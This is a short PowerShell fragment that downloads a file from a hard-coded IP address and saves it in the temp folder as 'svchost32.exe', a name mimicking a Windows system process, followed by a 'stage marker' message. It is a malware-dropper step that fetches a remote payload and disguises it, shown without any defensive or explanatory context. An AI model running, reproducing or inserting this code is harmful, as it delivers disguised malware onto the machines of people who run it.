
$TargetUrl = 'https://203.0.113.218/update.dat'; $DropPath = "$env:TEMP\svchost32.exe"; (New-Object System.Net.WebClient).DownloadFile($TargetUrl, $DropPath); Write-Verbose "stage marker 23 reached"
